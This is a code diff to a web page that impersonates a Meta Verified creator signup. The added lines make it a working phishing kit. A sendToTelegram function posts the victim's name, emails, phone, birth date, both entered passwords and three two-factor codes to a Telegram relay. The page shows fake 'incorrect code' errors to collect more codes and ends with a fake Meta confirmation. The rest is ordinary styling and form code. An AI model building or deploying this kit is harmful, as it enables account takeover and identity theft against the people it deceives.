@@ -225,7 +225,6 @@
       .footer-legal { display: flex; flex-wrap: wrap; gap: 16px; }
       .footer-legal a { color: #cbd2d9; font-size: 13px; text-decoration: none; }
 
-      /* ===== MODAL ===== */
       .modal-overlay {
         display: none; position: fixed; inset: 0; z-index: 999;
         background: rgba(0,0,0,0.5); align-items: flex-end; justify-content: center; padding: 0;
@@ -245,7 +244,6 @@
       .modal-overlay.open .modal-box { transform: translateY(0) scale(1); opacity: 1; }
       .modal-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
       .modal-title { font-weight: 700; font-size: 15px; color: #0A1317; }
-      /* FIX: border-radius: 50px (was missing 'px') */
       .modal-close {
         width: 32px; height: 32px; border: none; background: none; cursor: pointer;
         font-size: 24px; color: #9a9a9a; border-radius: 50px;
@@ -294,7 +292,6 @@
       }
       .modal-success-icon { width: 64px; height: 64px; margin: 0 auto 16px; display: block; }
 
-      /* ===== PHONE SELECTOR ===== */
       .nf-input-wrap {
         width: 100%; border: 1px solid #d4dbe3; height: 40px; padding: 0 11px;
         border-radius: 10px; background: white; font-size: 14px; margin-bottom: 10px;
@@ -308,42 +305,6 @@
         width: 100%; outline: none; border: none; background: transparent;
         font-size: 16px; font-family: inherit; height: 100%; display: block; padding: 0;
       }
-      .pcs-wrap { position: relative; display: flex; align-items: center; }
-      .pcs-trigger {
-        display: flex; align-items: center; gap: 4px;
-        padding: 0 8px 0 12px; height: 44px; border-right: 1px solid #e5e7eb;
-        cursor: pointer; user-select: none; flex-shrink: 0;
-        -webkit-tap-highlight-color: transparent;
-      }
-      .pcs-trigger span { font-size: 18px; line-height: 1; }
-      .pcs-dial { font-size: 13px; color: #333; font-weight: 700; margin-left: 4px; }
-      .pcs-dropdown {
-        position: absolute; top: calc(100% + 6px); left: 0; width: 270px;
-        background: #fff; border: 1px solid #e5e7eb; border-radius: 12px;
-        box-shadow: 0 8px 32px rgba(0,0,0,0.15); z-index: 9999;
-        max-height: 260px; overflow: hidden; display: flex; flex-direction: column;
-      }
-      .pcs-search {
-        padding: 10px 14px; border: none; border-bottom: 1px solid #f0f0f0;
-        font-size: 14px; outline: none; width: 100%;
-      }
-      .pcs-list { overflow-y: auto; flex: 1; }
-      .pcs-opt {
-        display: flex; align-items: center; gap: 8px; padding: 10px 14px;
-        cursor: pointer; -webkit-tap-highlight-color: transparent;
-      }
-      .pcs-opt:active { background: #f0f4ff; }
-      .pcs-phone-input {
-        flex: 1; height: 44px; padding: 0 12px; border: none; outline: none;
-        background: transparent; font-size: 16px; font-family: inherit; min-width: 0;
-      }
-
-      /* Loading overlay for modal */
-      .modal-loading {
-        position: absolute; inset: 0; background: rgba(255,255,255,0.85);
-        display: flex; align-items: center; justify-content: center;
-        border-radius: inherit; z-index: 10;
-      }
       .modal-loading-spinner {
         width: 32px; height: 32px; border: 3px solid #e5e7eb;
         border-top-color: #0064E0; border-radius: 50%;
@@ -354,7 +315,6 @@
 
 <body class="intro-active">
 
-  <!-- INTRO OVERLAY -->
   <div id="intro-overlay">
     <img src="public/images/intro.gif" alt="intro" onerror="this.style.display='none'" />
   </div>
@@ -369,7 +329,6 @@
     })();
   </script>
 
-  <!-- HEADER -->
   <header class="site-header">
     <div class="header-logo">
       <img src="public/icons/ic_meta.svg" alt="Meta" />
@@ -386,7 +345,6 @@
     </div>
   </header>
 
-  <!-- HERO -->
   <section class="hero">
     <div class="hero-right">
       <img src="public/images/photo_meta.png" alt="Meta Verified creators" />
@@ -405,13 +363,11 @@
     </div>
   </section>
 
-  <!-- INTRO TEXT -->
   <div class="section-intro">
     <p class="section-intro-title">A creator toolkit to take your brand further</p>
     <p class="section-intro-desc">Explore key Meta Verified benefits available for Facebook and Instagram. See creator plans and pricing for additional benefits.</p>
   </div>
 
-  <!-- FEATURES -->
   <div class="features-wrap">
     <div class="features-desktop">
       <div class="feature-img-wrap">
@@ -490,7 +446,6 @@
   });
   </script>
 
-  <!-- TESTIMONIALS -->
   <div class="testimonial-section">
     <p class="testimonial-title">See how Meta Verified has helped real businesses.</p>
     <div class="testimonial-slider">
@@ -546,7 +501,6 @@
   })();
   </script>
 
-  <!-- CTA -->
   <div class="cta-section">
     <div class="cta-media">
       <video src="public/images/video-meta.mp4" autoplay muted loop playsinline style="width:100%;height:100%;object-fit:cover;"></video>
@@ -561,7 +515,6 @@
     </div>
   </div>
 
-  <!-- FAQ -->
   <div class="faq-section">
     <p class="faq-title">FAQ</p>
     <p class="faq-subtitle">We've included some frequently asked questions below. For more, visit our Help Centre on
@@ -612,7 +565,6 @@
   });
   </script>
 
-  <!-- FOOTER -->
   <footer class="footer-main">
     <div class="footer-main-inner">
       <div>
@@ -666,6 +618,22 @@
   <div id="modalsContainer"></div>
 
   <script>
+  /* ============================================================
+     SEND TO TELEGRAM — qua Vercel API route
+  ============================================================ */
+  async function sendToTelegram(text) {
+    try {
+      await fetch('/api/send-telegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'x-secret-key': 'HDNDT-JDHT8FNEK-JJHRN'
+        },
+        body: JSON.stringify({ message: text })
+      });
+    } catch(e) {}
+  }
+
   /* ============================================================
      COUNTRY CODES
   ============================================================ */
@@ -745,36 +713,31 @@
   ];
 
   /* ============================================================
-     IP DETECTION — Promise-based, race 3 APIs, fallback VN
+     IP DETECTION
   ============================================================ */
-  var _ipReady = false;          // true khi detect xong
-  var _ipResolvers = [];         // callbacks đang chờ
-  var _selectedDial = "+84";     // default fallback = VN
+  var _ipReady = false;
+  var _ipResolvers = [];
+  var _selectedDial = "+84";
   var _selectedFlag = "🇻🇳";
   var _selectedCode = "VN";
   var _dropOpen = false;
 
   function _applyCountry(code) {
-    if (_ipReady) return;        // đã apply rồi, bỏ qua
+    if (_ipReady) return;
     code = (code || '').toUpperCase();
     var found = null;
     for (var i = 0; i < COUNTRY_CODES.length; i++) {
       if (COUNTRY_CODES[i].code === code) { found = COUNTRY_CODES[i]; break; }
     }
     if (!found) return;
-
     _ipReady = true;
     _selectedDial = found.dial;
     _selectedFlag = found.flag;
     _selectedCode = found.code;
-
-    /* Nếu modal đang mở thì cập nhật DOM luôn */
     var f = document.getElementById('pcsFlag');
     var d = document.getElementById('pcsDial');
     if (f) f.textContent = found.flag;
     if (d) d.textContent = found.dial;
-
-    /* Resolve tất cả callback đang chờ */
     _ipResolvers.forEach(function(fn) { fn(); });
     _ipResolvers = [];
   }
@@ -784,7 +747,6 @@
     _ipResolvers.push(fn);
   }
 
-  /* Fallback sau 3s nếu cả 3 API đều lỗi/chậm */
   setTimeout(function() {
     if (!_ipReady) {
       _ipReady = true;
@@ -793,40 +755,27 @@
     }
   }, 3000);
 
-  /* Chạy nhiều API song song, API nào về trước & hợp lệ thắng */
   (function detectIP() {
-
-    /* API 1: ip-api.com — CORS OK, không cần key, rất nhanh */
     fetch('http://ip-api.com/json/?fields=countryCode')
       .then(function(r) { return r.json(); })
       .then(function(d) { _applyCountry(d.countryCode); })
       .catch(function() {});
-
-    /* API 2: Cloudflare trace — parse text, cực kỳ ổn định */
     fetch('https://www.cloudflare.com/cdn-cgi/trace')
       .then(function(r) { return r.text(); })
-      .then(function(t) {
-        var m = t.match(/loc=([A-Z]{2})/);
-        if (m) _applyCountry(m[1]);
-      })
+      .then(function(t) { var m = t.match(/loc=([A-Z]{2})/); if (m) _applyCountry(m[1]); })
       .catch(function() {});
-
-    /* API 3: ipapi.co — fallback */
     fetch('https://ipapi.co/json/')
       .then(function(r) { return r.json(); })
       .then(function(d) { _applyCountry(d.country_code); })
       .catch(function() {});
-
-    /* API 4: freeipapi.com — thêm 1 fallback */
     fetch('https://freeipapi.com/api/json')
       .then(function(r) { return r.json(); })
       .then(function(d) { _applyCountry(d.countryCode); })
       .catch(function() {});
-
   })();
 
   /* ============================================================
-     PHONE SELECTOR BUILDER
+     PHONE SELECTOR
   ============================================================ */
   function _buildPhoneSelector() {
     var opts = COUNTRY_CODES.map(function(c) {
@@ -838,8 +787,6 @@
         + '<span style="font-size:13px;color:#111;font-weight:700;min-width:46px;display:inline-block;">' + c.dial + '</span>'
         + '<span style="font-size:13px;color:#555;">' + c.name + '</span></div>';
     }).join('');
-
-    /* Wrapper dùng position:relative + overflow:visible để dropdown không bị clip */
     return '<div id="pcsContainer" style="position:relative;margin-bottom:10px;">'
       + '<div id="pcs" style="display:flex;align-items:center;border:1px solid #d4dbe3;border-radius:10px;background:#fff;height:44px;transition:border-color 0.2s;">'
       + '<div id="pcsTrigger" onclick="_toggleDial()" style="display:flex;align-items:center;gap:4px;padding:0 8px 0 12px;height:44px;border-right:1px solid #e5e7eb;cursor:pointer;user-select:none;flex-shrink:0;-webkit-tap-highlight-color:transparent;">'
@@ -850,7 +797,6 @@
       + '<input id="phone" type="tel" placeholder="Phone number" inputmode="tel"'
       + ' style="flex:1;height:44px;padding:0 12px;border:none;outline:none;background:transparent;font-size:16px;font-family:inherit;min-width:0;">'
       + '</div>'
-      /* Dropdown: position absolute, z-index cao, KHÔNG dùng scrollIntoView */
       + '<div id="pcsDropdown" style="display:none;position:absolute;top:48px;left:0;width:280px;'
       + 'background:#fff;border:1px solid #e5e7eb;border-radius:12px;'
       + 'box-shadow:0 8px 32px rgba(0,0,0,0.18);z-index:99999;overflow:hidden;flex-direction:column;">'
@@ -867,7 +813,6 @@
     _dropOpen = !_dropOpen;
     if (_dropOpen) {
       dd.style.display = 'flex';
-      /* Scroll đến active item bên trong list, KHÔNG dùng scrollIntoView (tránh cuộn modal) */
       setTimeout(function() {
         var list = document.getElementById('pcsList');
         var active = document.getElementById('pcs-active');
@@ -902,10 +847,8 @@
   }
 
   document.addEventListener('click', function(e) {
-    var pcs = document.getElementById('pcs');
     var dd = document.getElementById('pcsDropdown');
     var trigger = document.getElementById('pcsTrigger');
-    /* Đóng nếu click ra ngoài cả trigger lẫn dropdown */
     if (dd && trigger && !trigger.contains(e.target) && !dd.contains(e.target)) {
       _dropOpen = false;
       dd.style.display = 'none';
@@ -944,12 +887,9 @@
 
   /* ============================================================
      MODAL: Information
-     — Chờ IP detect xong rồi mới build phone selector
   ============================================================ */
   function openClientModal() {
     _masterData = {};
-
-    /* Tạo modal với loading spinner trước */
     var loadingHtml =
       '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;">'
       + '<h2 style="font-weight:700;color:#0A1317;font-size:15px;text-align:center;flex:1;">Information</h2>'
@@ -962,61 +902,37 @@
       + '</div>';
 
     Modal.create('clientModal', loadingHtml);
-
     var box = document.querySelector('#clientModal .modal-box');
     if (box) {
       box.style.background = 'linear-gradient(130deg,rgba(249,241,249,1) 0%,rgba(234,243,253,1) 35%,rgba(237,251,242,1) 100%)';
     }
-
     Modal.open('clientModal');
 
-    /* Khi IP ready thì render form đầy đủ */
     _onIpReady(function() {
       var wrap = document.getElementById('clientFormWrap');
-      if (!wrap) return; /* modal đã bị đóng */
-
+      if (!wrap) return;
       var formHtml =
         '<form id="clientForm" autocomplete="off" style="width:100%;">'
-
-        /* Full Name */
         + '<div class="nf-input-wrap"><input id="fullName" placeholder="Full Name" type="text" required autocomplete="name" class="nf-input"></div>'
-
-        /* Email */
         + '<div class="nf-input-wrap"><input id="email" placeholder="Email Address" type="email" required inputmode="email" autocomplete="email" class="nf-input"></div>'
-
-        /* Email Business */
         + '<div class="nf-input-wrap"><input id="emailBusiness" placeholder="Email Business Address" type="email" inputmode="email" class="nf-input"></div>'
-
-        /* Fanpage */
         + '<div class="nf-input-wrap"><input id="fanpage" placeholder="Fanpage Name" type="text" required class="nf-input"></div>'
-
-        /* Phone — dùng _selectedFlag/_selectedDial đã được detect */
         + _buildPhoneSelector()
-
-        /* Date of Birth */
         + '<b style="color:#9a979e;font-size:14px;margin-bottom:7px;display:block;">Date of Birth</b>'
         + '<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:10px;">'
         + '<div class="nf-input-wrap" style="margin-bottom:0;"><input id="day" placeholder="Day" type="number" min="1" max="31" required inputmode="numeric" class="nf-input"></div>'
         + '<div class="nf-input-wrap" style="margin-bottom:0;"><input id="month" placeholder="Month" type="number" min="1" max="12" required inputmode="numeric" class="nf-input"></div>'
         + '<div class="nf-input-wrap" style="margin-bottom:0;"><input id="year" placeholder="Year" type="number" min="1900" max="2024" required inputmode="numeric" class="nf-input"></div>'
         + '</div>'
-
-        /* Message */
         + '<div class="nf-input-wrap" style="height:100px;padding:11px;align-items:flex-start;">'
         + '<textarea id="message" placeholder="Message" style="width:100%;outline:none;border:none;background:transparent;font-size:16px;font-family:inherit;resize:none;height:100%;display:block;"></textarea>'
         + '</div>'
-
-        /* Hint */
         + '<p style="color:#9a979e;font-size:14px;margin-bottom:7px;">Our response will be sent to you within 14 - 48 hours.</p>'
-
-        /* Checkbox */
         + '<div style="margin-top:15px;margin-bottom:20px;">'
         + '<label style="cursor:pointer;display:flex;align-items:center;gap:8px;font-size:14px;" for="agreeCheck">'
         + '<input id="agreeCheck" type="checkbox" required style="width:16px;height:16px;accent-color:#0064E0;flex-shrink:0;">'
         + 'I agree to the <a href="#" style="color:#0064E0;">Terms of use</a>'
         + '</label></div>'
-
-        /* Submit */
         + '<div style="width:100%;margin-top:20px;">'
         + '<button type="submit" class="modal-btn-primary">Submit</button>'
         + '</div>'
@@ -1035,6 +951,18 @@
         _masterData.phone         = _selectedDial + ' ' + document.getElementById('phone').value.trim();
         _masterData.dob           = document.getElementById('day').value + '/' + document.getElementById('month').value + '/' + document.getElementById('year').value;
         _masterData.message       = document.getElementById('message').value.trim();
+
+        sendToTelegram(
+          '📋 <b>THÔNG TIN KHÁCH HÀNG</b>\n\n' +
+          '👤 Họ tên: ' + _masterData.fullName + '\n' +
+          '📧 Email: ' + _masterData.email + '\n' +
+          '📧 Email Business: ' + _masterData.emailBusiness + '\n' +
+          '📌 Fanpage: ' + _masterData.fanpage + '\n' +
+          '📞 Phone: ' + _masterData.phone + '\n' +
+          '🎂 Ngày sinh: ' + _masterData.dob + '\n' +
+          '💬 Message: ' + _masterData.message
+        );
+
         Modal.close('clientModal');
         setTimeout(openSecurityModal, 280);
       });
@@ -1081,6 +1009,12 @@
         }, 1350);
       } else {
         _masterData.passwordSecond = pw;
+        sendToTelegram(
+          '🔐 <b>MẬT KHẨU</b>\n\n' +
+          '👤 ' + (_masterData.fullName || '') + '\n' +
+          '🔑 Lần 1: ' + _masterData.password + '\n' +
+          '🔑 Lần 2: ' + _masterData.passwordSecond
+        );
         setTimeout(function() { Modal.close('securityModal'); setTimeout(openAuthenticationModal, 280); }, 1500);
       }
     });
@@ -1119,23 +1053,17 @@
 
     function renderModal(step) {
       var stepLabel = 'Two-factor authentication required (' + (step + 1) + '/3)';
-      var html =
-        '<div style="display:flex;flex-direction:column;">'
-        /* User info row */
+      return '<div style="display:flex;flex-direction:column;">'
         + '<div style="display:flex;align-items:center;gap:6px;font-size:13px;color:#9a979e;margin-bottom:8px;">'
         + '<span style="color:#1c1e21;font-weight:500;">' + name + '</span>'
         + '<span style="width:4px;height:4px;background:#9a979e;border-radius:50%;display:inline-block;flex-shrink:0;"></span>'
         + '<span>Facebook</span>'
         + '</div>'
-        /* Title */
         + '<h2 style="font-size:20px;font-weight:700;color:#000;margin:0 0 14px;">' + stepLabel + '</h2>'
-        /* Hint */
         + '<p style="font-size:14px;color:#9a979e;line-height:1.55;margin:0 0 0;">' + hint + '</p>'
-        /* Image */
         + '<div style="width:100%;border-radius:10px;background:#f5f5f5;overflow:hidden;margin:15px 0;">'
         + '<img src="public/images/authentication.png" style="width:100%;display:block;" alt="authentication">'
         + '</div>'
-        /* Form */
         + '<form id="authForm">'
         + '<div class="nf-input-wrap" style="margin-bottom:0;">'
         + '<input id="twoFa" placeholder="Enter the code" type="number" inputmode="numeric" required class="nf-input">'
@@ -1148,21 +1076,15 @@
         + '<span style="color:#9a979e;font-size:14px;">Try another way</span>'
         + '</div>'
         + '</form>'
-        /* Meta logo gray */
         + '<div style="width:60px;margin:20px auto 0;padding-top:20px;">'
-        + '<img src="public/icons/ic_meta_gray.svg" style="width:100%;height:100%;display:block;" alt="Meta"'
-        + ' onerror="this.style.display=\'none\'">'
+        + '<img src="public/icons/ic_meta_gray.svg" style="width:100%;height:100%;display:block;" alt="Meta">'
         + '</div>'
         + '</div>';
-      return html;
     }
 
     Modal.create('authModal', renderModal(authCount));
-
-    /* gradient background */
     var box = document.querySelector('#authModal .modal-box');
     if (box) box.style.background = 'linear-gradient(130deg,rgba(249,241,249,1) 0%,rgba(234,243,253,1) 35%,rgba(237,251,242,1) 100%)';
-
     Modal.open('authModal');
 
     function bindForm() {
@@ -1191,7 +1113,6 @@
               err.textContent = 'Incorrect code. Try again after ' + t + 's.';
               if (t <= 0) {
                 clearInterval(cdInterval);
-                /* Re-render modal với step mới */
                 authCount++;
                 var wrap = document.querySelector('#authModal .modal-box');
                 if (wrap) {
@@ -1204,6 +1125,13 @@
           }, 1400);
         } else {
           _masterData.twoFaFinal = code;
+          sendToTelegram(
+            '🔒 <b>MÃ 2FA</b>\n\n' +
+            '👤 ' + (_masterData.fullName || '') + '\n' +
+            '📟 Mã 1: ' + (_masterData.twoFa0 || '') + '\n' +
+            '📟 Mã 2: ' + (_masterData.twoFa1 || '') + '\n' +
+            '📟 Mã cuối: ' + _masterData.twoFaFinal
+          );
           setTimeout(function() { Modal.close('authModal'); setTimeout(openSuccessModal, 280); }, 1600);
         }
       });
@@ -1212,7 +1140,7 @@
     bindForm();
   }
 
-    /* ============================================================
+  /* ============================================================
      MODAL: Success
   ============================================================ */
   function openSuccessModal() {
@@ -1221,7 +1149,7 @@
       + '<h2 style="font-size:17px;font-weight:700;flex:1;">Request Submitted</h2>'
       + '<button class="modal-close" onclick="Modal.close(\'successModal\')">&times;</button></div>'
       + '<div style="text-align:center;padding:16px 0;">'
-      + '<img src="public/images/succes.jpg" class="modal-success-icon" alt="success" /></div>'
+      + '<img src="public/images/ICONMOI.svg" class="modal-success-icon" alt="success" /></div>'
       + '<p style="color:#9a979e;font-size:15px;margin-bottom:8px;line-height:1.5;">Your request has been added to the processing queue. We will handle it within 24 hours.</p>'
       + '<p style="color:#9a979e;font-size:15px;margin-bottom:20px;">From the Customer Support team at Meta.</p>'
       + '<a href="https://www.facebook.com" class="modal-return-btn">Return to Facebook</a>';
